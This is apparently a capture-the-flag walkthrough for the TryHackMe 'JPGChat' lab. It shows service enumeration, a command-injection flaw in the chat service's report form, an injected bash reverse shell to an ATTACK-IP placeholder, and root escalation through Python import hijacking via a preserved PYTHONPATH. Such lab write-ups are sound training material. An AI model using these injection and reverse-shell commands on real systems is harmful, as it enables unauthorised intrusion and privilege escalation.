# Try Hack Me - JPGChat

**Categories:** python3, os, chatting, report  
**Difficulty:** Easy  

Commands used in this guide use the exported variable $IP (`export IP=10.10.41.149`) in place of the target machine's IP address.

## 1: Enumeration - rustcan, nmap
 
Following a rustmap scan, we run a nmap version scan on the 2 discovered ports (22, 3000) : 

```console
┌──(kali㉿kali)-[~]
└─$ sudo nmap $IP -sV -p22,3000
...snip...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
3000/tcp open  ppp?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.91%I=7%D=10/31%Time=617ED5FC%P=x86_64-pc-linux-gnu%r(N
SF:ULL,E2,"Welcome\x20to\x20JPChat\nthe\x20source\x20code\x20of\x20this\x2
SF:0service\x20can\x20be\x20found\x20at\x20our\x20admin's\x20github\nMESSA
```

A google / searchsploit search gives a username enumeration vulnerability for the discovered SSH version, but this isn't much use to us in this context. The output from the application on 3000 indicates that a custom service may be running on this port - we can confirm this by connecting to the service with netcat : 

```console
┌──(kali㉿kali)-[~]
└─$ nc $IP 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
```

The service's welcome message tells us that source code is available on Github, and running in "\[REPORT\]" mode gives us a possible account name :

```console
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[REPORT]
this report will be read by Mozzie-jpg
your name:
```

A google search for "Mozzie-jpg github" reveals their GitHub page, with the source code for the service available in the [JPChat repository](https://github.com/Mozzie-jpg/JPChat).

## 2: Foothold - source code analysis, command injection

The source code is comprised of two functions : `chatting_service()` requests and handles user input, and `report_form()` implements the "\[REPORT\]" mode functionality :

```python
def report_form():
	print ('this report will be read by Mozzie-jpg')
	your_name = input('your name:\n')
	report_text = input('your report:\n')
	os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
	os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)
```

We probably didn't need access to the source code to identify this vulnerability, but the two calls to `os.system` are vulnerable to command injection. The user input passed to the `your_name` variable is concatenated to the call to `bash -c` without proper sanitization, allowing us to execute arbitrary commands by beginning our input with the command separation character ";". We can see more clearly how this allows for command injection by replicating the string concatenation locally :

```console
>>> print('echo %s > /opt/jpchat/logs/report.txt' % "; whoami ;")
echo ; whoami ; > /opt/jpchat/logs/report.txt
```

To exploit the vulnerability, we start an nc listener on the attack machine, and we pass a Bash reverse shell to either one of the input calls made by the service (the second ";" after the reverse shell is important - if we omit it, the shell output will be redirected by the ">" or ">>" used in the the original command) : 

```console
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[REPORT]       
this report will be read by Mozzie-jpg
your name:
; bash -i >& /dev/tcp/ATTACK-IP/4242 0>&1 ;
your report:
anything
```

```console
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4242
listening on [any] 4242 ...
connect to [ATTACK-IP] from (UNKNOWN) [10.10.41.149] 45044
wes@ubuntu-xenial:/$ id
id=1001(wes) gid=1001(wes) groups=1001(wes)
```

The user flag is at `/home/wes/user.txt`.

## 3: Privesc - python import hijacking

Running `sudo -l` as the wes user, we discover that they can run a python script `/opt/development/test_module.py` as root without providing a password : 

```console
wes@ubuntu-xenial:/$ sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```

The script (which is not writeable by wes) is very simple, importing the compare module and calling `.Str` :

```python
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))
```

This script is possible vulnerable to import hijacking. I've written more on import hijacking and how python resolves module imports in [a writeup on a different THM walkthrough (spoilers!)](./wonderland.md). In short, python searches for imported modules in locations on `sys.path`, always starting with the  script's parent directory, followed by locations defined by the PYTHONPATH environment variable, and finally checking standard python install directories.

Hijacking the import requires that we can write a replacement `compare.py` file to one of these locations. The `/opt/development` parent directory is not writeable by the wes user, and nor are the standard python install directories. That leaves the PYTHONPATH environment variable - obviously we can change this to whatever we want, but [sudo drops environment variables by default](https://man7.org/linux/man-pages/man5/sudoers.5.html#DESCRIPTION). Looking again at the output of `sudo -l` however, we see that an env_keep key is set for the PYTHONPATH variable, meaning that this variable will be preserved in the sudo environment :

```console
wes@ubuntu-xenial:/$ sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH
```

So import hijacking is back on the menu - here's what we need to do :

1. Create a replacement `compare.py` file in wes' home directory. This file doesn't need to emulate the legitimate `compare.py` module in any way - python automatically executes any code contained in imported modules, so our malicious code will be executed before python errors out complaining that we didn't define the required `.Str` method.
2. Add wes' home directory to the PYTHONPATH environment variable
3. Call the script `/opt/development/test_module.py` using sudo - with env_keep preserving PYTHONPATH, the script will load our malicious `compare.py` module and execute our code as root. 

So to start, we create a `compare.py` file at `/home/wes` that launches a Bash shell :

```console
wes@ubuntu-xenial:/$ echo "import os; os.system('bash')" > /home/wes/compare.py
```

We then add `/home/wes` to the python path environment variable :

```console
export PYTHONPATH=/home/wes
```

and we call the `/opt/development/test_module.py` script using sudo : 

```console
wes@ubuntu-xenial:/$ sudo /usr/bin/python3 /opt/development/test_module.py
whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
```

The root flag is at `/root/root.txt`
